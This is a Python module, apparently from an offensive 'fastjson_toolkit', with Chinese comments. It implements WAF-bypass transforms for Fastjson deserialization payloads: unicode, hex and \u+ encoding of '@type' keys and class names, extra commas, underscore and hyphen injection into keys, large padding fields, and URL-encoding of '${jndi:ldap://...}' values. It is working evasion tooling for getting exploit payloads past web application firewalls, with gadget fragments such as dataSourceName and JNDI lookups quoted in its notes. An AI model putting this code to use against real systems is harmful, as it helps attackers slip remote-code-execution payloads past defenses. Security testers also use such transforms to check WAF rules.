"""Fastjson WAF 绕过变换（unicode/hex、多逗号、key _/-、填充等）。"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Callable, Iterable
from fastjson_toolkit.waf.models import WafOptions, WafTechniqueInfo

TECHNIQUES: list[WafTechniqueInfo] = [
    WafTechniqueInfo(
        id="unicode",
        title="Unicode 编码",
        description=r'将字符串编为 \uXXXX（如 @type → \u0040\u0074...）',
        notes=["Fastjson 解析器支持 JSON 字符串内的 \\u 转义"],
    ),
    WafTechniqueInfo(
        id="hex",
        title="Hex 编码",
        description=r"将字符串编为 \xHH（Fastjson 扩展）",
        notes=[r"示例：com.sun... → \x63\x6f\x6d\x2e..."],
    ),
    WafTechniqueInfo(
        id="unicode_hex",
        title="Unicode + Hex 混编",
        description=r"@ 等用 \x，字母用 \u；value 优先 hex（对齐常见笔记）",
        notes=[
            r'{"\x40\u0074\u0079\u0070\u0065":"\x63\x6f\x6d..."}',
        ],
    ),
    WafTechniqueInfo(
        id="unicode_plus",
        title=r"Unicode \u+ 绕过",
        description=r"使用 Fastjson 支持的 \u+XXX 形式（可非 4 位）",
        notes=[r'{"\u+040\u+074...":"java.lang.AutoCloseabl\u+065"}'],
    ),
    WafTechniqueInfo(
        id="multi_comma",
        title="多余逗号",
        description="在对象字段之间插入多个逗号，干扰基于关键字的 WAF",
        notes=['{,,,,,,"@type":"...",,,,,,,"dataSourceName":"..."}'],
    ),
    WafTechniqueInfo(
        id="key_underscore",
        title="Key 插入 _",
        description="字段名插入下划线；Fastjson 解析 key 时会去掉 _",
        notes=[
            "1.2.36 之前 _ 与 - 通常不能混用",
            "'d_a_t_aSourceName' → dataSourceName",
        ],
    ),
    WafTechniqueInfo(
        id="key_hyphen",
        title="Key 插入 -",
        description="字段名插入连字符；Fastjson 解析 key 时会去掉 -",
        notes=["与 _ 同类机制"],
    ),
    WafTechniqueInfo(
        id="key_mixed",
        title="Key 混用 _/-",
        description="字段名混合插入 _ 与 -（需 Fastjson ≥1.2.36）",
        notes=["1.2.36 起支持混合"],
    ),
    WafTechniqueInfo(
        id="pad",
        title="字符填充",
        description="追加超长无关字段，抬高包体体积以绕过长度/特征检测",
        notes=['"f":"a"*20000'],
    ),
    WafTechniqueInfo(
        id="url_value",
        title="Value URL 编码",
        description="对字符串 value 中的特殊字符做百分号编码（如 ${} → %7b%7d）",
        notes=[
            r'dataSourceName":"$%7bjndi:ldap://...%7d"',
        ],
    ),
]


@dataclass(frozen=True)
class _StrSpan:
    start: int  # opening quote index
    end: int  # index after closing quote
    quote: str
    content: str
    is_key: bool


def list_techniques() -> list[WafTechniqueInfo]:
    return list(TECHNIQUES)


def get_technique(tech_id: str) -> WafTechniqueInfo | None:
    for t in TECHNIQUES:
        if t.id == tech_id:
            return t
    return None


def _scan_strings(text: str) -> list[_StrSpan]:
    """扫描 JSON 风格字符串字面量（支持 \" ' 与常见转义）。"""
    spans: list[_StrSpan] = []
    i = 0
    n = len(text)
    while i < n:
        ch = text[i]
        if ch not in ('"', "'"):
            i += 1
            continue
        quote = ch
        j = i + 1
        content_chars: list[str] = []
        while j < n:
            c = text[j]
            if c == "\\":
                if j + 1 >= n:
                    break
                content_chars.append(text[j : j + 2])
                j += 2
                continue
            if c == quote:
                end = j + 1
                k = end
                while k < n and text[k].isspace():
                    k += 1
                is_key = k < n and text[k] == ":"
                spans.append(
                    _StrSpan(
                        start=i,
                        end=end,
                        quote=quote,
                        content="".join(content_chars),
                        is_key=is_key,
                    )
                )
                i = end
                break
            content_chars.append(c)
            j += 1
        else:
            break
    return spans


def _encode_unicode(s: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in s)


def _encode_hex(s: str) -> str:
    out: list[str] = []
    for c in s:
        code = ord(c)
        if code > 0xFF:
            out.append(f"\\u{code:04x}")
        else:
            out.append(f"\\x{code:02x}")
    return "".join(out)


def _encode_unicode_hex_mix(s: str, *, as_key: bool) -> str:
    """笔记风格：key 中 @ 用 hex、字母用 unicode；value 优先 hex。"""
    if not as_key:
        return _encode_hex(s)
    out: list[str] = []
    for c in s:
        code = ord(c)
        if c == "@" or not c.isalpha():
            if code > 0xFF:
                out.append(f"\\u{code:04x}")
            else:
                out.append(f"\\x{code:02x}")
        else:
            out.append(f"\\u{code:04x}")
    return "".join(out)


def _encode_unicode_plus(s: str) -> str:
    """\\u+XXX：十六进制可不补齐到 4 位。"""
    out: list[str] = []
    for c in s:
        hx = format(ord(c), "x")
        out.append(f"\\u+{hx}")
    return "".join(out)


def _should_touch_key(raw_key: str, opts: WafOptions, *, for_sep: bool) -> bool:
    if for_sep:
        targets = opts.key_targets
        if targets:
            return raw_key in targets
        if raw_key == "@type":
            return opts.include_type_key
        return True
    targets = opts.encode_targets
    if not targets:
        return True
    return raw_key in targets


def _decoded_literal_content(content: str) -> str:
    """尽量还原字面量内容（仅处理常见 \\u / \\x / \\\" 等，供 key 比对）。"""
    out: list[str] = []
    i = 0
    n = len(content)
    while i < n:
        if content[i] != "\\" or i + 1 >= n:
            out.append(content[i])
            i += 1
            continue
        esc = content[i + 1]
        if esc == "u" and i + 2 < n and content[i + 2] == "+":
            j = i + 3
            while j < n and j < i + 3 + 4 and content[j] in "0123456789abcdefABCDEF":
                j += 1
            if j > i + 3:
                out.append(chr(int(content[i + 3 : j], 16)))
                i = j
                continue
        if esc == "u" and i + 6 <= n:
            hx = content[i + 2 : i + 6]
            if all(c in "0123456789abcdefABCDEF" for c in hx):
                out.append(chr(int(hx, 16)))
                i += 6
                continue
        if esc == "x" and i + 4 <= n:
            hx = content[i + 2 : i + 4]
            if all(c in "0123456789abcdefABCDEF" for c in hx):
                out.append(chr(int(hx, 16)))
                i += 4
                continue
        mapping = {"n": "\n", "r": "\r", "t": "\t", '"': '"', "'": "'", "\\": "\\", "/": "/"}
        out.append(mapping.get(esc, esc))
        i += 2
    return "".join(out)


def _rewrite_strings(
    text: str,
    *,
    key_fn: Callable[[str, str], str | None] | None = None,
    value_fn: Callable[[str, str], str | None] | None = None,
) -> str:
    """按 span 从后往前改写，避免偏移错乱。

    key_fn/value_fn(content, raw_key) -> new content（不含引号）；返回 None 表示跳过。
    value 的 raw_key 为该字面量前最近一个 key。
    """
    spans = _scan_strings(text)
    if not spans:
        return text

    last_key = ""
    keyed: list[tuple[_StrSpan, str]] = []
    for sp in spans:
        if sp.is_key:
            last_key = _decoded_literal_content(sp.content)
            keyed.append((sp, last_key))
        else:
            keyed.append((sp, last_key))

    parts = list(text)
    for sp, raw_key in reversed(keyed):
        if sp.is_key:
            if key_fn is None:
                continue
            new_content = key_fn(sp.content, raw_key)
        else:
            if value_fn is None:
                continue
            new_content = value_fn(sp.content, raw_key)
        if new_content is None or new_content == sp.content:
            continue
        replacement = f"{sp.quote}{new_content}{sp.quote}"
        parts[sp.start : sp.end] = list(replacement)
    return "".join(parts)


def apply_encode(
    text: str,
    opts: WafOptions,
    *,
    style: str,
) -> str:
    if style not in {"unicode", "hex", "unicode_hex", "unicode_plus"}:
        raise ValueError(f"unknown encode style: {style}")

    def _enc(raw: str, *, as_key: bool) -> str:
        if style == "unicode":
            return _encode_unicode(raw)
        if style == "hex":
            return _encode_hex(raw)
        if style == "unicode_plus":
            return _encode_unicode_plus(raw)
        return _encode_unicode_hex_mix(raw, as_key=as_key)

    def key_fn(content: str, raw_key: str) -> str | None:
        if not opts.encode_keys:
            return None
        if opts.encode_targets and raw_key not in opts.encode_targets:
            return None
        return _enc(_decoded_literal_content(content), as_key=True)

    def value_fn(content: str, raw_key: str) -> str | None:
        if not opts.encode_values:
            return None
        if opts.encode_targets and raw_key not in opts.encode_targets:
            return None
        return _enc(_decoded_literal_content(content), as_key=False)

    return _rewrite_strings(text, key_fn=key_fn, value_fn=value_fn)


def _insert_separators(key: str, style: str) -> str:
    if len(key) <= 1:
        return key
    chars = list(key)
    out = [chars[0]]
    for i, ch in enumerate(chars[1:], start=1):
        if style == "underscore":
            sep = "_"
        elif style == "hyphen":
            sep = "-"
        else:  # mixed
            sep = "_" if i % 2 else "-"
        out.append(sep)
        out.append(ch)
    return "".join(out)


def apply_key_sep(text: str, opts: WafOptions, *, style: str) -> str:
    spans = _scan_strings(text)
    parts = list(text)
    for sp in reversed(spans):
        if not sp.is_key:
            continue
        raw_key = _decoded_literal_content(sp.content)
        if not _should_touch_key(raw_key, opts, for_sep=True):
            continue
        new_key = _insert_separators(raw_key, style)
        quote = "'" if opts.use_single_quote else sp.quote
        replacement = f"{quote}{new_key}{quote}"
        parts[sp.start : sp.end] = list(replacement)
    return "".join(parts)


def apply_multi_comma(text: str, opts: WafOptions) -> str:
    """在 `{` 后与字段分隔 `,` 后插入多余逗号（跳过字符串内）。"""
    n = opts.comma_count
    extra = "," * n
    spans = _scan_strings(text)
    protected: list[tuple[int, int]] = [(s.start, s.end) for s in spans]

    def in_string(idx: int) -> bool:
        for a, b in protected:
            if a <= idx < b:
                return True
        return False

    out: list[str] = []
    i = 0
    length = len(text)
    while i < length:
        ch = text[i]
        out.append(ch)
        if not in_string(i):
            if ch == "{":
                # 仅当后面不是立即结束的空对象时插入
                j = i + 1
                while j < length and text[j].isspace():
                    j += 1
                if j < length and text[j] != "}":
                    out.append(extra)
            elif ch == ",":
                # 避免在已经是多余逗号串上无限膨胀：若下一段已是逗号则跳过
                j = i + 1
                while j < length and text[j].isspace():
                    j += 1
                if j < length and text[j] != "," and text[j] != "}":
                    out.append(extra)
        i += 1
    # 尾部空白对齐笔记：在结尾 } 前加一点空白
    result = "".join(out)
    result = re.sub(r"\}\s*$", "         }", result, count=1)
    return result


def _find_root_object_close(text: str) -> int | None:
    """返回根对象闭合 `}` 的下标；支持根为对象或单元素数组。"""
    spans = _scan_strings(text)
    protected = [(s.start, s.end) for s in spans]

    def in_string(idx: int) -> bool:
        for a, b in protected:
            if a <= idx < b:
                return True
        return False

    start = 0
    while start < len(text) and text[start].isspace():
        start += 1
    if start >= len(text):
        return None

    # 若根是数组，取第一个对象
    if text[start] == "[":
        i = start + 1
        while i < len(text) and (text[i].isspace() or text[i] == ","):
            i += 1
        if i >= len(text) or text[i] != "{":
            return None
        start = i

    if text[start] != "{":
        return None

    depth = 0
    for i in range(start, len(text)):
        if in_string(i):
            continue
        ch = text[i]
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return i
    return None


def apply_pad(text: str, opts: WafOptions) -> str:
    close = _find_root_object_close(text)
    if close is None:
        raise ValueError("无法定位根 JSON 对象以插入填充字段")
    pad = opts.pad_char * opts.pad_size
    # 转义填充串内的引号/反斜杠
    pad_lit = pad.replace("\\", "\\\\").replace('"', '\\"')
    key = opts.pad_key.replace("\\", "\\\\").replace('"', '\\"')
    insertion = f',"{key}":"{pad_lit}"'
    # 若 } 前已有逗号则不再加前导逗号
    left = text[:close].rstrip()
    if left.endswith(","):
        insertion = f'"{key}":"{pad_lit}"'
        return left + insertion + text[close:]
    return text[:close] + insertion + text[close:]


def apply_url_value(text: str, opts: WafOptions) -> str:
    def value_fn(content: str, raw_key: str) -> str | None:
        if not opts.encode_values:
            return None
        if opts.encode_targets and raw_key not in opts.encode_targets:
            return None
        raw = _decoded_literal_content(content)
        # 对齐笔记：${jndi:...} → $%7bjndi:...%7d
        return raw.replace("{", "%7b").replace("}", "%7d")

    return _rewrite_strings(text, value_fn=value_fn)


_APPLY: dict[str, Callable[[str, WafOptions], str]] = {
    "unicode": lambda t, o: apply_encode(t, o, style="unicode"),
    "hex": lambda t, o: apply_encode(t, o, style="hex"),
    "unicode_hex": lambda t, o: apply_encode(t, o, style="unicode_hex"),
    "unicode_plus": lambda t, o: apply_encode(t, o, style="unicode_plus"),
    "multi_comma": apply_multi_comma,
    "key_underscore": lambda t, o: apply_key_sep(t, o, style="underscore"),
    "key_hyphen": lambda t, o: apply_key_sep(t, o, style="hyphen"),
    "key_mixed": lambda t, o: apply_key_sep(t, o, style="mixed"),
    "pad": apply_pad,
    "url_value": apply_url_value,
}


def apply_technique(text: str, technique: str, opts: WafOptions | None = None) -> str:
    opts = opts or WafOptions()
    fn = _APPLY.get(technique)
    if fn is None:
        known = ", ".join(_APPLY)
        raise ValueError(f"未知 technique: {technique}；可选: {known}")
    return fn(text, opts)


def apply_stack(
    text: str,
    techniques: Iterable[str],
    opts: WafOptions | None = None,
) -> str:
    opts = opts or WafOptions()
    out = text
    for tech in techniques:
        out = apply_technique(out, tech, opts)
    return out
